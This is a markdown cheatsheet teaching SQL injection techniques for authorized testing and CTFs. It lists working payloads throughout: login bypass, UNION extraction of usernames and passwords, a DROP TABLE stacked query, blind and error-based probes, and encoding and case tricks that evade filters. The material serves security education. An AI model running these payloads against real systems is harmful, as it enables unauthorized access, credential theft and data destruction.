---
tags:
  - "SQL Injection"
---

# SQL Injection Bypass Cheatsheet

> A practical reference for understanding common SQL Injection filter-bypass and exploitation techniques in authorized security testing, labs, CTFs, and controlled environments.

---

## 1. Authentication Bypass

Authentication bypass payloads attempt to alter the logic of an insecure login query.

### Common Payloads

```sql
' OR '1'='1' --
' OR 1=1#
admin' --
admin'/*

```

### Concept

An insecure application may construct a query similar to:

```sql
SELECT * FROM users
WHERE username = '<INPUT>'
AND password = '<PASSWORD>';

```

Injecting a tautological condition can alter the intended logic.

> These techniques depend on the application directly concatenating user-controlled input into SQL queries.

---

## 2. Tautology-Based Injection

A tautology introduces a condition that evaluates to true.

### Examples

```sql
' OR 1=1 --
' OR 'a'='a'

```

### Resulting Query

```sql
SELECT * FROM users
WHERE username = '' OR 1=1 --'
AND password = '';

```

The injected condition:

```sql
1=1

```

is always true.

---

## 3. Comment-Based Injection

SQL comments can terminate or suppress the remainder of a vulnerable query.

### Common Comment Syntax

```text
--
#
/*

```

### Example

```sql
' OR 1=1 --

```

The exact comment syntax supported depends on the target DBMS and query context.

---

## 4. Encoding-Based Bypass

Encoding can sometimes bypass simplistic input filters that search for literal characters or keywords.

### URL Encoding

Common examples:

```text
'       → %27
--      → %2D%2D

```

Example:

```text
%27%20OR%201%3D1--%20

```

### Double URL Encoding

A second encoding layer can represent already-encoded characters:

```text
%27

```

becomes:

```text
%2527

```

### Important

Encoding does **not** inherently bypass a properly implemented SQL injection defense.

Its effectiveness depends on where and how decoding occurs in the application's request-processing pipeline.

---

## 5. Whitespace & Case Variation

Simple filters may look for exact strings or patterns.

SQL syntax can sometimes be represented using alternative whitespace or comment forms.

### Keyword Case Variation

```sql
SeLeCT * FrOm users

```

### Comment-Based Separation

```sql
UN/**/ION/**/SELECT

```

### Alternative Whitespace

Depending on the context, spaces may be represented by:

```text
\t
\n

```

or SQL comments:

```sql
/**/

```

> Whether a particular variation works depends on the DBMS, parser, application framework, and filtering layer.

---

## 6. Blind SQL Injection

Blind SQL Injection applies when the application does not directly return useful database errors or query results.

The attacker instead observes differences in application behavior.

### Boolean-Based

True condition:

```sql
' AND 1=1 --

```

False condition:

```sql
' AND 1=2 --

```

Compare differences such as:

- HTTP response
- response length
- status code
- page content
- application behavior

### Time-Based

A time delay can be used to distinguish conditions.

Example from the source for MySQL:

```sql
' OR IF(1=1, SLEEP(5), 0) --

```

> Time-based techniques should only be used in authorized environments because they intentionally introduce delays and can impact application performance.

---

## 7. Stacked Queries

Stacked queries attempt to execute multiple SQL statements through a single injection point.

### Example

```sql
'; DROP TABLE users; --

```

Support varies between database engines, drivers, APIs, and configuration.

> Destructive statements such as `DROP TABLE` should only be demonstrated against intentionally vulnerable lab environments.

---

## 8. Error-Based SQL Injection

Error-based techniques intentionally trigger database errors that may expose useful information.

### MSSQL Example

```sql
' AND 1=CONVERT(int, (SELECT @@version)) --

```

### MySQL-Style Example

```sql
' AND (
    SELECT 1
    FROM (
        SELECT COUNT(*),
        CONCAT(user,0x3a,pass)
        FROM users
        GROUP BY 1
    ) a
) --

```

Potentially useful information can include:

- Database type
- Database version
- Query information
- Application/database behavior

---

## 9. UNION-Based SQL Injection

`UNION` can combine the result of an injected query with the result of the original query when the application is vulnerable.

### Example

```sql
' UNION SELECT null, username, password FROM users --

```

### Finding Column Count

A common methodology is to determine the number of columns accepted by the original query before constructing a compatible `UNION`.

For example:

```sql
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --

```

Continue until the application's behavior indicates that the column number is invalid.

> The exact technique and syntax depend on the target DBMS and query structure.

---

## 10. Second-Order SQL Injection

Second-order SQL Injection differs from a direct injection because the malicious input is stored first and used later.

### Typical Flow

```text
User Input
    ↓
Stored by Application
    ↓
Later Retrieved
    ↓
Used in Vulnerable Query
    ↓
SQL Injection

```

### Example

A username containing:

```text
admin'--

```

may initially be stored normally.

If the application later inserts that stored value into an unsafe SQL query, the injection may execute at that later point.

### Why It Matters

Second-order vulnerabilities can be difficult to identify because:

- the initial request may appear harmless
- exploitation occurs in a different application flow
- the vulnerable query may be far away from the original input point

---

# 11. Advanced Techniques

## Concatenation-Based Variations

Different DBMSs provide different operators and functions for manipulating strings.

Example from the source:

```sql
' OR 'a' + 'a'='aa' --

```

This syntax is associated with MSSQL-style string concatenation.

---

## Database Version Detection

### MySQL

```sql
' UNION SELECT version() --

```

### MSSQL

```sql
' UNION SELECT @@version --

```

Database-specific functions can help identify the underlying DBMS and version when the application is vulnerable to information disclosure through SQL injection.

---

# 12. Input Locations to Test

Do not limit SQL Injection testing to login forms.

Potential input locations include:

```text
GET parameters
POST parameters
Cookies
HTTP headers
Search fields
Form fields
Path parameters
JSON parameters

```

A useful testing methodology is:

```text
Identify Input
      ↓
Observe Normal Behavior
      ↓
Test Syntax Changes
      ↓
Identify DBMS Behavior
      ↓
Determine Injection Type
      ↓
Validate Impact

```

---

# 13. Proxy-Based Testing

HTTP interception tools can make SQLi testing significantly easier.

A typical workflow:

```text
Browser
   ↓
Intercepting Proxy
   ↓
Application
   ↓
Database

```

Useful capabilities include:

- intercepting requests
- modifying parameters
- replaying requests
- comparing responses
- testing multiple payload variants

---

# 14. Quick Reference

| Technique             | Purpose                       | Example                |
| --------------------- | ----------------------------- | ---------------------- |
| Authentication Bypass | Alter login logic             | `' OR 1=1 --`          |
| Tautology             | Force a true condition        | `' OR 'a'='a'`         |
| SQL Comments          | Ignore query remainder        | `--`                   |
| URL Encoding          | Represent special characters  | `%27`                  |
| Double Encoding       | Encode encoded characters     | `%2527`                |
| Case Variation        | Bypass simplistic matching    | `SeLeCT`               |
| Comment Separation    | Alter keyword matching        | `UN/**/ION`            |
| Boolean Blind         | Detect behavioral differences | `' AND 1=1 --`         |
| Time Blind            | Detect timing differences     | `SLEEP(5)`             |
| Error-Based           | Trigger database errors       | `CONVERT(...)`         |
| UNION-Based           | Combine query results         | `UNION SELECT`         |
| Second-Order          | Trigger stored input later    | Stored malicious value |

---

# 15. Testing Checklist

### Discovery

- Identify all user-controlled inputs
- Test GET parameters
- Test POST parameters
- Test cookies
- Test relevant headers
- Test search and filter parameters
- Identify interesting application behavior

### Injection Analysis

- Test quote handling
- Test tautologies
- Test SQL comments
- Test case variations
- Test encoding variations
- Determine whether errors are exposed
- Compare true/false responses

### Database Identification

- Identify potential DBMS
- Check DBMS-specific syntax
- Check version disclosure where authorized
- Determine supported query behavior

### Exploitation Analysis

- Determine injection type
- Determine column count for UNION testing
- Check whether output is reflected
- Test blind behavior where appropriate
- Check for second-order injection paths

### Documentation

- Record vulnerable parameter
- Record HTTP request
- Record successful test case
- Capture response evidence
- Identify database behavior
- Document impact
- Document remediation

---

# 16. Methodology

A useful SQL Injection testing workflow:

```text
Recon
  ↓
Identify Inputs
  ↓
Baseline Request
  ↓
Test Injection Behavior
  ↓
Identify Injection Type
  ↓
Identify DBMS
  ↓
Validate Impact
  ↓
Document Evidence

```

Avoid jumping immediately to complex payloads.

Understanding **why** a payload works is more valuable than maintaining a large list of strings.

---

# 17. Key Takeaways

- SQL Injection occurs when untrusted input influences SQL syntax or query logic.
- Authentication bypasses commonly rely on altering boolean logic.
- SQL comments can suppress the remainder of a vulnerable query.
- Encoding may bypass simplistic filters depending on where decoding occurs.
- Blind SQLi relies on behavioral or timing differences.
- Error-based SQLi relies on database error behavior.
- UNION-based SQLi depends on compatible query structures.
- Second-order SQLi executes through previously stored input.
- SQL syntax varies significantly between DBMS implementations.
- Always test inputs systematically rather than relying on a single payload.
- Use proxy tooling to inspect, modify, replay, and compare requests.
- Perform testing only against systems where you have explicit authorization.

---

## References

- OWASP SQL Injection
- OWASP Testing Guide
- PortSwigger Web Security Academy — SQL Injection
- DBMS-specific SQL documentation

> **Use these techniques only against systems you own or are explicitly authorized to test.**
